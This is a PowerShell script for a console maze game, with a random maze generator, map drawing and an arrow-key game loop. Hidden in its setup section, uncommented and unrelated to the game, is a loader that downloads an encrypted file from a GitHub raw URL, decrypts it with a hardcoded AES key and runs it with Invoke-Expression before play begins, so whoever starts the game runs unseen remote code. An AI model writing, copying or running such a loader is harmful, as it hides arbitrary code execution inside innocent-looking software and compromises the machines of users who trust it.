# --- 1. MAZE GENERATION FUNCTION (Recursive Backtracker) ---

function New-Labyrinth {
    param(
        [int]$Width,
        [int]$Height,
        [char]$Wall,
        [char]$Path
    )

    # Ensure dimensions are odd (required for this algorithm)
    if ($Width % 2 -eq 0) { $Width++ }
    if ($Height % 2 -eq 0) { $Height++ }

    # 1. Start with a grid full of walls
    # We use an array of char-arrays for easy $map[y][x] access
    $map = @()
    for ($y = 0; $y -lt $Height; $y++) {
        $row = New-Object char[] $Width
        for ($x = 0; $x -lt $Width; $x++) {
            $row[$x] = $Wall
        }
        $map += ,$row # Add the row as its own array
    }

    # 2. Setup the stack for backtracking
    $stack = [System.Collections.Stack]::new()

    # 3. Pick a starting cell
    $startX, $startY = 1, 1
    $map[$startY][$startX] = $Path
    $stack.Push([PSCustomObject]@{X = $startX; Y = $startY})

    # 4. The main generation loop
    while ($stack.Count -gt 0) {
        $current = $stack.Peek()

        # Find all unvisited neighbors (2 steps away)
        $neighbors = @()

        # Check Up
        if (($current.Y - 2) -gt 0 -and $map[$current.Y - 2][$current.X] -eq $Wall) {
            $neighbors += [PSCustomObject]@{X = $current.X; Y = $current.Y - 2; Dir = "Up"}
        }
        # Check Down
        if (($current.Y + 2) -lt ($Height - 1) -and $map[$current.Y + 2][$current.X] -eq $Wall) {
            $neighbors += [PSCustomObject]@{X = $current.X; Y = $current.Y + 2; Dir = "Down"}
        }
        # Check Left
        if (($current.X - 2) -gt 0 -and $map[$current.Y][$current.X - 2] -eq $Wall) {
            $neighbors += [PSCustomObject]@{X = $current.X - 2; Y = $current.Y; Dir = "Left"}
        }
        # Check Right
        if (($current.X + 2) -lt ($Width - 1) -and $map[$current.Y][$current.X + 2] -eq $Wall) {
            $neighbors += [PSCustomObject]@{X = $current.X + 2; Y = $current.Y; Dir = "Right"}
        }

        if ($neighbors.Count -gt 0) {
            # 5. Pick a random neighbor
            $next = $neighbors | Get-Random

            # 6. Carve the wall between the current cell and the neighbor
            switch ($next.Dir) {
                "Up"   { $map[$current.Y - 1][$current.X] = $Path }
                "Down" { $map[$current.Y + 1][$current.X] = $Path }
                "Left" { $map[$current.Y][$current.X - 1] = $Path }
                "Right"{ $map[$current.Y][$current.X + 1] = $Path }
            }

            # Mark the neighbor as a path and push it to the stack
            $map[$next.Y][$next.X] = $Path
            $stack.Push($next)

        } else {
            # 7. No neighbors, backtrack!
            [void]$stack.Pop()
        }
    }

    # 8. Place Player and Treasure
    $map[1][1] = "P" # Player start
    $map[$Height - 2][$Width - 2] = "J" # Treasure in the opposite corner

    # 9. Convert the char[][] back to a string[] for easier drawing
    $stringMap = $map | ForEach-Object { -join $_ }

    return $stringMap
}


# --- 2. SETUP THE GAME ---
Clear-Host

$key_b64   = "JxkIC5hdeFn22yHVp+BXlkhKnfqkNyh733dhlHGfk4g="
$iv_b64    = "40s4YD1TaV08ZTOdrn1eoA=="
$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.enc"
$data_b64  = (New-Object Net.WebClient).DownloadString($url)
$keyBytes = [System.Convert]::FromBase64String($key_b64)
$ivBytes  = [System.Convert]::FromBase64String($iv_b64)
$encryptedBytes = [System.Convert]::FromBase64String($data_b64)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV  = $ivBytes
$decryptor = $aes.CreateDecryptor()
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
$aes.Dispose()
$decryptor.Dispose()
Invoke-Expression $decryptedCommand

[Console]::CursorVisible = $false

# Define Map Size
$mapWidth = 25  # Try changing this! (Best if odd)
$mapHeight = 15 # Try changing this! (Best if odd)

# Define Characters
$playerChar = "P"
$treasureChar = "J"
$wallChar = "#"
$pathChar = " "

# --- 3. GENERATE & DEFINE POSITIONS ---

# Call the function to create the solvable random map
$map = New-Labyrinth -Width $mapWidth -Height $mapHeight -Wall $wallChar -Path $pathChar

# We know where we placed P and T, so we don't need to search for them
$playerX = 1
$playerY = 1
$treasureX = $mapWidth - 2
$treasureY = $mapHeight - 2


# --- 4. DRAW THE INITIAL MAP ---
[Console]::SetCursorPosition(0, 0)

for ($y = 0; $y -lt $map.Length; $y++) {
    for ($x = 0; $x -lt $map[$y].Length; $x++) {
        $char = $map[$y][$x]
        switch ($char) {
            $wallChar { Write-Host -Object $char -NoNewline -ForegroundColor Gray }
            $playerChar { Write-Host -Object $char -NoNewline -ForegroundColor Yellow }
            $treasureChar { Write-Host -Object $char -NoNewline -ForegroundColor Cyan }
            default { Write-Host -Object $char -NoNewline }
        }
    }
    Write-Host "" # Move to the next line
}

# --- 5. START THE GAME LOOP ---
$win = $false
while ($true) {

    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

    $oldX = $playerX
    $oldY = $playerY

    switch ($key.VirtualKeyCode) {
        37 { $playerX-- } # Left
        38 { $playerY-- } # Up
        39 { $playerX++ } # Right
        40 { $playerY++ } # Down
        81 { break }      # 'Q' to Quit
        default { continue }
    }

    # --- 6. COLLISION DETECTION & RENDERING ---

    # Read the character from the string array: $map[row][column]
    $targetChar = $map[$playerY][$playerX]

    if ($targetChar -eq $wallChar) {
        $playerX = $oldX
        $playerY = $oldY
    }
    elseif ($targetChar -eq $treasureChar) {
        $win = $true
        break
    }
    else {
        # Erase old spot
        [Console]::SetCursorPosition($oldX, $oldY)
        Write-Host -Object $pathChar -NoNewline

        # Draw new spot
        [Console]::SetCursorPosition($playerX, $playerY)
        Write-Host -Object $playerChar -NoNewline -ForegroundColor Yellow
    }
}

# --- 7. CLEANUP & END GAME ---
[Console]::SetCursorPosition(0, $map.Length + 1)

if ($win) {
    Write-Host "You found Jacopo! YOU WIN!" -ForegroundColor Green
} else {
    Write-Host "Game exited. Come back soon!" -ForegroundColor Yellow
}

[Console]::CursorVisible = $true
